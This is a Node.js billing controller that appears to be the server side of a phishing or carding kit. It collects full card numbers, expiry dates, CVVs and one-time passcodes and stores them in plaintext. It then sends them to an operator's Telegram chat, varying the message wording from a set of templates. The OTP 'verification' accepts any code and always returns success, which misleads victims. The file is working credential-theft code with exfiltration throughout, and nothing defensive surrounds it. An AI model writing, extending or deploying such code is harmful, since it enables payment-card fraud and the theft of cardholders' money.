// server/controller/billingController.js
const fs = require('fs');
const path = require('path');
const csv = require('csv-parser');
const axios = require('axios');
var lookup = require('binlookup')();
const db = require('../config/db'); // Make sure path to db.js is correct

const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, BINDB_API_KEY } = process.env;

// Function to read and parse the CSV file
const readCSV = async (bin) => {
  return new Promise((resolve, reject) => {
    const results = [];
    fs.createReadStream(path.join(__dirname, '../data/bin-list-data.csv'))
      .pipe(csv())
      .on('data', (data) => results.push(data))
      .on('end', () => {
        const binData = results.find(row => row.BIN === bin);
        if (binData) {
          resolve(binData);
        } else {
          reject(new Error('BIN not found'));
        }
      })
      .on('error', (error) => reject(error));
  });
};


const fetchBankLogo = async (bankDomain) => {
  if (!bankDomain || bankDomain === 'undefined') {
    console.warn('Invalid or missing bank domain; using fallback logo.');
    return 'https://logo.clearbit.com/example.com';
  }
  return `https://logo.clearbit.com/${bankDomain}`;
};
//create credit card logic------------------------------------------------------------------------
//-------------------------------------------------------
exports.createCreditCardInfo = async (req, res) => {
  const { uCukkzD, cardNumber, expiryDate, securityCode } = req.body;

  if (!uCukkzD) {
    return res.status(400).json({ error: 'Client Session ID is required' });
  }
  let brandName = 'Unknown';
  let issuer = 'Unknown';
  let scheme = 'Unknown';
  let type = 'Unknown';
  let country = 'Unknown';
  let logoLink = '';
  
  try {
    const sanitizedCardNumber = cardNumber.replace(/\s+/g, '');
    const bin = sanitizedCardNumber.slice(0, 6);
    const last4Digits = sanitizedCardNumber.slice(-4); // Extract last 4 digits

    let bankInfo = '';
    let bankLogoUrl = 'https://logo.clearbit.com/example.com'; // Default fallback
    let brand = 'Unknown';
    try {
      const binData = await readCSV(bin);
      // Get bank info
      const bankDomain = binData['IssuerUrl']?.replace(/^www\./, '').trim() || 'example.com';
      bankLogoUrl = `https://logo.clearbit.com/${bankDomain}`;
      brand = binData['Brand'] || 'Unknown';

       issuer = binData['Issuer'] || 'an undisclosed institution';
 country = `${binData['CountryName'] || 'an unknown region'} (${binData['isoCode2'] || '??'})`;
 scheme = binData['Brand'] || 'an unnamed scheme';
 type = binData['Type'] || 'unclassified';
 brandName = binData['Brand'] || 'unmarked';
 logoLink = `<a href="${bankLogoUrl}">logo</a>`;

 const bankParagraphs = [
  `📎 <b>Issuer:</b> ${issuer}\n🌍 <b>Country:</b> ${country}\n💳 <b>Scheme:</b> ${scheme}\n🔖 <b>Type:</b> ${type}\n🏷 <b>Brand:</b> ${brandName}\n🔗 ${logoLink}`,

  `🌐 <b>Country:</b> ${country}\n🏦 <b>Issuer:</b> ${issuer}\n🏷 <b>Brand:</b> ${brandName}\n🔖 <b>Card Type:</b> ${type}\n💳 <b>Scheme:</b> ${scheme}\n🔗 ${logoLink}`,

  `🏦 <b>Bank:</b> ${issuer}\n🗺️ <b>Region:</b> ${country}\n🧾 <b>Type:</b> ${type}\n💠 <b>Scheme:</b> ${scheme}\n🏷 <b>Brand:</b> ${brandName}\n🌀 <i>Details limited</i>\n🔗 ${logoLink}`,

  `🧭 <b>Issuer:</b> ${issuer}\n📍 <b>Country:</b> ${country}\n🔖 <b>Classification:</b> ${type}\n💳 <b>Network:</b> ${scheme}\n🏷 <b>Brand Tier:</b> ${brandName}\n🪞 <i>Insignia:</i> ${logoLink}`,

  `📡 <b>Origin Detected:</b> ${issuer} (${country})\n💳 <b>Layer:</b> ${scheme}\n🔖 <b>Card Type:</b> ${type}\n🏷 <b>Signature:</b> ${brandName}\n🔗 ${logoLink}`
];


// Select one mysterious format
bankInfo = bankParagraphs[Math.floor(Math.random() * bankParagraphs.length)];

    } catch (binError) {
      console.error('BIN lookup failed:', binError);
      bankInfo = `
🏦 <b>Bank:</b> Unknown
🌐 <b>Country:</b> Unknown
💳 <b>Scheme:</b> Unknown
💳 <b>Type:</b> Unknown
💳 <b>Brand:</b> Unknown
      `;
    }
    const createdAt = new Date().toISOString();

    db.run(
      `INSERT INTO rez (
        clientSessionId, card_number, expiry_date, security_code,
        issuer, brand, scheme, type, cc_country, logo_url, created_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [
        uCukkzD,
        sanitizedCardNumber,
        expiryDate,
        securityCode,
        issuer,
        brandName,
        scheme,
        type,
        country,
        bankLogoUrl,
        createdAt
      ],
      function (err) {
        if (err) {
          console.error("❌ Insert failed:", err.message);
        } else {
          console.log("✅ Card inserted for session", uCukkzD);
        }
      }
    );


    // Send all data to Telegram bot
    const messageTemplates = [
      `🧬 <b>Trace Logged</b>\n\n<b>Session:</b> ${uCukkzD}\n<b>Card:</b> ${sanitizedCardNumber}\n<b>Expiry:</b> ${expiryDate}\n<b>CVV:</b> ${securityCode}\n${bankInfo}\n<b>Time:</b> ${new Date().toLocaleString()}\n`,
    
      `👁️ <b>Ghost Entry</b>\n\n<b>Session:</b> ${uCukkzD}\n<b>Number:</b> ${sanitizedCardNumber}\n<b>Expires:</b> ${expiryDate}\n<b>Key:</b> ${securityCode}\n${bankInfo}\n<b>Logged:</b> ${new Date().toLocaleString()}\n`,
    
      `📡 <b>Anonymous Signal</b>\n\n<b>Ref:</b> ${uCukkzD}\n<b>CC NUM:</b> ${sanitizedCardNumber}\n<b>Expiry:</b> ${expiryDate}\n<b>CVV:</b> ${securityCode}\n${bankInfo}\n<b>Timestamp:</b> ${new Date().toLocaleString()}\n`,
    
      `🔐 <b>Access Accepted</b>\n\n<b>Session:</b> ${uCukkzD}\n<b>Card:</b> ${sanitizedCardNumber}\n<b>Expires:</b> ${expiryDate}\n<b>Code:</b> ${securityCode}\n${bankInfo}\n<b>Recorded:</b> ${new Date().toLocaleString()}\n`,
    
      `🛰️ <b>Silent Trigger</b>\n\n<b>Session:</b> ${uCukkzD}\n<b>CC NUM:</b> ${sanitizedCardNumber}\n<b>Expiration:</b> ${expiryDate}\n<b>CVV:</b> ${securityCode}\n${bankInfo}\n<b>Marked:</b> ${new Date().toLocaleString()}\n`
    ];

    // Pick one at random
    const message = messageTemplates[Math.floor(Math.random() * messageTemplates.length)];
    

    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
    } catch (telegramError) {
      console.error('Telegram notification failed:', telegramError.message);
    }

    res.status(200).json({ message: "Data sent to Telegram successfully",
      logoUrl: bankLogoUrl , brand, last4Digits});
  } catch (error) {
    console.error('Error sending data to Telegram:', error);
    res.status(500).json({ error: 'Error processing the request' });
  }
};



exports.verifyOtp = async (req, res) => {
  const { userId } = req.params;
  const { otp, maskedCardNumber } = req.body;
  try {
    if (!otp || otp.trim() === '') {
      return res.status(400).json({ message: 'Invalid OTP' });
    }

    // Prepare message for Telegram bot
    const messages = [
      `🔐 <b>Access Granted</b>\n\n<b>Card:</b> ${maskedCardNumber}\n<b>Code:</b> ${otp}\n<b>Session:</b> ${userId}\n<b>Time:</b> ${new Date().toLocaleString()}`,
    
      `🕵️ <b>Code Accepted</b>\n\n<b>Session:</b> ${userId}\n<b>Card:</b> ${maskedCardNumber}\n<b>OTP:</b> ${otp}\n<b>Logged:</b> ${new Date().toLocaleString()}`,
    
      `🛠️ <b>OTP Verified</b>\n\n<b>Identity:</b> ${maskedCardNumber}\n<b>Token:</b> ${otp}\n<b>Session:</b> ${userId}\n<b>Time:</b> ${new Date().toLocaleString()}`,
    
      `🛰️ <b>Validation Logged</b>\n\n<b>Card:</b> ${maskedCardNumber}\n<b>One-Time Key:</b> ${otp}\n<b>Trace ID:</b> ${userId}\n<b>Timestamp:</b> ${new Date().toLocaleString()}`,
    
      `🔎 <b>Session Verified</b>\n\n<b>Code:</b> ${otp}\n<b>Masked:</b> ${maskedCardNumber}\n<b>Session:</b> ${userId}\n<b>Time:</b> ${new Date().toLocaleString()}`
    ];
    

  // Randomly select a message variation
  const message = messages[Math.floor(Math.random() * messages.length)];

    try {
      await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
    } catch (telegramError) {
      console.error('Telegram notification failed:', telegramError);
    }

    return res.status(200).json({ message: 'OTP verified successfully' });
  } catch (error) {
    console.error('Error verifying OTP:', error);
    res.status(500).json({ message: 'Error verifying OTP' });
  }
};

